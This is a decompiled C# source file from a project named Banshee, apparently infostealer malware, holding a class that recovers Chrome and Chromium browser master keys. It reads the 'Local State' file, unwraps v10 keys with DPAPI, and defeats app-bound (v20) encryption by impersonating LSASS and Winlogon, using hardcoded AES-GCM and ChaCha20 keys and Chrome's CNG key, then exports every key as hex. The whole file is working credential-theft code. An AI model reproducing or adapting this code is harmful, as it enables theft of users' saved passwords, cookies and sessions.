﻿using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

namespace Banshee.Helper.Encrypted
{
	// Token: 0x020000E2 RID: 226
	public static class LocalState
	{
		// Token: 0x060002F0 RID: 752 RVA: 0x00017568 File Offset: 0x00017568
		public static List<string[]> GetMasterKeys()
		{
			List<string[]> list = new List<string[]>();
			foreach (KeyValuePair<string, Lazy<byte[]>> keyValuePair in LocalState._masterKeyCacheV10)
			{
				try
				{
					string text = keyValuePair.Key ?? "";
					Lazy<byte[]> value = keyValuePair.Value;
					if (value != null)
					{
						byte[] value2 = value.Value;
						if (value2 != null)
						{
							StringBuilder stringBuilder = new StringBuilder(value2.Length * 2);
							foreach (byte b in value2)
							{
								stringBuilder.Append(b.ToString("X2"));
							}
							list.Add(new string[]
							{
								text,
								"v10",
								stringBuilder.ToString()
							});
						}
					}
				}
				catch
				{
				}
			}
			foreach (KeyValuePair<string, Lazy<byte[]>> keyValuePair2 in LocalState._masterKeyCacheV20)
			{
				try
				{
					string text2 = keyValuePair2.Key ?? "";
					Lazy<byte[]> value3 = keyValuePair2.Value;
					if (value3 != null)
					{
						byte[] value4 = value3.Value;
						if (value4 != null)
						{
							StringBuilder stringBuilder2 = new StringBuilder(value4.Length * 2);
							foreach (byte b2 in value4)
							{
								stringBuilder2.Append(b2.ToString("X2"));
							}
							list.Add(new string[]
							{
								text2,
								"v20",
								stringBuilder2.ToString()
							});
						}
					}
				}
				catch
				{
				}
			}
			return list;
		}

		// Token: 0x060002F1 RID: 753 RVA: 0x00017738 File Offset: 0x00017738
		public static byte[] MasterKeyV20(string localstate)
		{
			SemaphoreSlim orAdd = LocalState._locks.GetOrAdd(localstate, (string _) => new SemaphoreSlim(1, 1));
			orAdd.Wait();
			byte[] value;
			try
			{
				Lazy<byte[]> lazy;
				if (LocalState._masterKeyCacheV20.TryGetValue(localstate, out lazy))
				{
					value = lazy.Value;
				}
				else
				{
					Lazy<byte[]> lazy2 = new Lazy<byte[]>(() => LocalState.ComputeMasterKeyV20(localstate));
					LocalState._masterKeyCacheV20[localstate] = lazy2;
					value = lazy2.Value;
				}
			}
			finally
			{
				orAdd.Release();
			}
			return value;
		}

		// Token: 0x060002F2 RID: 754 RVA: 0x000177F0 File Offset: 0x000177F0
		private static byte[] ComputeMasterKeyV20(string localstate)
		{
			try
			{
				Match match = Regex.Match(LocalState.LocalStateContent(localstate), "\\\"app_bound_encrypted_key\\\"\\s*:\\s*\\\"([^\\\"]+)\\\"");
				if (!match.Success)
				{
					DebugLogger.Log("[LocalState] app_bound_encrypted_key not found in Local State JSON.");
				}
				else
				{
					string value = match.Groups[1].Value;
					DebugLogger.Log(string.Format("[LocalState] Found app_bound_encrypted_key, length={0}.", (value != null) ? value.Length : 0));
					try
					{
						byte[] array = Convert.FromBase64String(value);
						if (array.Length <= 4)
						{
							DebugLogger.Log("[LocalState] app_bound_encrypted_key payload too short after base64 decode.");
							return null;
						}
						byte[] array2 = LocalState.DecryptAsSystemUser(array.Skip(4).ToArray<byte>(), delegate(string msg)
						{
							DebugLogger.Log(msg);
						});
						if (array2 == null)
						{
							DebugLogger.Log("[LocalState] Primary DPAPI unwrap (SYSTEM->user) failed; skipping app-bound master key derivation.");
							return null;
						}
						BlobParsedData blobParsedData = ParseKeyBlob.Parse(array2);
						DebugLogger.Log(string.Format("[LocalState] Parsed app-bound blob flag={0}.", blobParsedData.Flag));
						byte flag = blobParsedData.Flag;
						switch (flag)
						{
						case 1:
						{
							byte[] array3 = AesGcm256.Decrypt(new byte[]
							{
								179,
								28,
								110,
								36,
								26,
								200,
								70,
								114,
								141,
								169,
								193,
								250,
								196,
								147,
								102,
								81,
								207,
								251,
								148,
								77,
								20,
								58,
								184,
								22,
								39,
								107,
								204,
								109,
								160,
								40,
								71,
								135
							}, blobParsedData.Iv, null, blobParsedData.Ciphertext, blobParsedData.Tag);
							DebugLogger.Log(string.Format("[LocalState] Derived v20 master key (flag 1) length={0}.", (array3 != null) ? array3.Length : 0));
							return array3;
						}
						case 2:
						{
							byte[] array4 = ChaCha20Poly1305.Decrypt(new byte[]
							{
								233,
								143,
								55,
								215,
								244,
								225,
								250,
								67,
								61,
								25,
								48,
								77,
								194,
								37,
								128,
								66,
								9,
								14,
								45,
								29,
								126,
								234,
								118,
								112,
								212,
								31,
								115,
								141,
								8,
								114,
								150,
								96
							}, blobParsedData.Iv, blobParsedData.Ciphertext, blobParsedData.Tag, null);
							DebugLogger.Log(string.Format("[LocalState] Derived v20 master key (flag 2) length={0}.", (array4 != null) ? array4.Length : 0));
							return array4;
						}
						case 3:
						{
							byte[] array5 = new byte[]
							{
								204,
								248,
								161,
								206,
								197,
								102,
								5,
								184,
								81,
								117,
								82,
								186,
								26,
								45,
								6,
								28,
								3,
								162,
								158,
								144,
								39,
								79,
								178,
								252,
								245,
								155,
								164,
								183,
								92,
								57,
								35,
								144
							};
							byte[] array6 = LocalState.CDecryptor(blobParsedData.EncryptedAesKey, delegate(string msg)
							{
								DebugLogger.Log(msg);
							});
							if (array6 == null)
							{
								DebugLogger.Log("[LocalState] Failed to decrypt flag 3 encrypted key; skipping master key derivation.");
								return null;
							}
							for (int i = 0; i < array6.Length; i++)
							{
								byte[] array7 = array6;
								int num = i;
								array7[num] ^= array5[i];
							}
							byte[] array8 = AesGcm256.Decrypt(array6, blobParsedData.Iv, null, blobParsedData.Ciphertext, blobParsedData.Tag);
							DebugLogger.Log(string.Format("[LocalState] Derived v20 master key (flag 3) length={0}.", (array8 != null) ? array8.Length : 0));
							return array8;
						}
						default:
							if (flag != 32)
							{
								DebugLogger.Log(string.Format("[LocalState] Unsupported app-bound flag {0}; unable to derive master key.", blobParsedData.Flag));
								return null;
							}
							DebugLogger.Log("[LocalState] Returning embedded key for flag 32.");
							return blobParsedData.EncryptedAesKey;
						}
					}
					catch (Exception ex)
					{
						DebugLogger.Log("[LocalState] Primary app_bound_encrypted_key derivation failed: " + ex.Message);
						return null;
					}
				}
			}
			catch
			{
			}
			return null;
		}

		// Token: 0x060002F3 RID: 755 RVA: 0x00017B0C File Offset: 0x00017B0C
		public static byte[] MasterKeyV10(string localstate)
		{
			SemaphoreSlim orAdd = LocalState._locks.GetOrAdd(localstate, (string _) => new SemaphoreSlim(1, 1));
			orAdd.Wait();
			byte[] value;
			try
			{
				Lazy<byte[]> lazy;
				if (LocalState._masterKeyCacheV10.TryGetValue(localstate, out lazy))
				{
					value = lazy.Value;
				}
				else
				{
					Lazy<byte[]> lazy2 = new Lazy<byte[]>(() => LocalState.ComputeMasterKeyV10(localstate));
					LocalState._masterKeyCacheV10[localstate] = lazy2;
					value = lazy2.Value;
				}
			}
			finally
			{
				orAdd.Release();
			}
			return value;
		}

		// Token: 0x060002F4 RID: 756 RVA: 0x00017BC4 File Offset: 0x00017BC4
		private static byte[] ComputeMasterKeyV10(string localstate)
		{
			byte[] result;
			try
			{
				Match match = Regex.Match(LocalState.LocalStateContent(localstate), "\"encrypted_key\":\"(.*?)\"");
				if (!match.Success)
				{
					result = null;
				}
				else
				{
					result = DpApi.Decrypt(Convert.FromBase64String(match.Groups[1].Value).Skip(5).ToArray<byte>());
				}
			}
			catch
			{
				result = null;
			}
			return result;
		}

		// Token: 0x060002F5 RID: 757 RVA: 0x00017C30 File Offset: 0x00017C30
		private static byte[] CDecryptor(byte[] encryptedData, Action<string> debugLog = null)
		{
			byte[] result;
			try
			{
				using (ImpersonationHelper.ImpersonateLsass())
				{
					result = CngDecryptor.Decrypt(encryptedData, "Microsoft Software Key Storage Provider", "Google Chromekey1");
				}
			}
			catch (Exception ex)
			{
				if (debugLog != null)
				{
					debugLog("[LocalState] LSASS CNG decrypt failed: " + ex.Message);
				}
				using (ImpersonationHelper.ImpersonateWinlogon())
				{
					result = CngDecryptor.Decrypt(encryptedData, "Microsoft Software Key Storage Provider", "Google Chromekey1");
				}
			}
			return result;
		}

		// Token: 0x060002F6 RID: 758 RVA: 0x00017CC8 File Offset: 0x00017CC8
		private static byte[] DecryptAsSystemUser(byte[] encryptedData, Action<string> debugLog = null)
		{
			try
			{
				using (ImpersonationHelper.ImpersonateLsass())
				{
					encryptedData = DpApi.Decrypt(encryptedData);
				}
			}
			catch (Exception ex)
			{
				if (debugLog != null)
				{
					debugLog("[LocalState] LSASS DPAPI decrypt failed: " + ex.Message);
				}
				using (ImpersonationHelper.ImpersonateWinlogon())
				{
					encryptedData = DpApi.Decrypt(encryptedData);
				}
			}
			byte[] result;
			try
			{
				result = DpApi.Decrypt(encryptedData);
			}
			catch (Exception ex2)
			{
				if (debugLog != null)
				{
					debugLog("[LocalState] User DPAPI decrypt failed after SYSTEM unwrap: " + ex2.Message);
				}
				result = null;
			}
			return result;
		}

		// Token: 0x060002F7 RID: 759 RVA: 0x00017D84 File Offset: 0x00017D84
		private static string LocalStateContent(string localstate)
		{
			string text = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
			File.Copy(localstate, text, true);
			string result = File.ReadAllText(text);
			File.Delete(text);
			return result;
		}

		// Token: 0x04000247 RID: 583
		private static readonly ConcurrentDictionary<string, Lazy<byte[]>> _masterKeyCacheV10 = new ConcurrentDictionary<string, Lazy<byte[]>>();

		// Token: 0x04000248 RID: 584
		private static readonly ConcurrentDictionary<string, Lazy<byte[]>> _masterKeyCacheV20 = new ConcurrentDictionary<string, Lazy<byte[]>>();

		// Token: 0x04000249 RID: 585
		private static readonly ConcurrentDictionary<string, SemaphoreSlim> _locks = new ConcurrentDictionary<string, SemaphoreSlim>();
	}
}
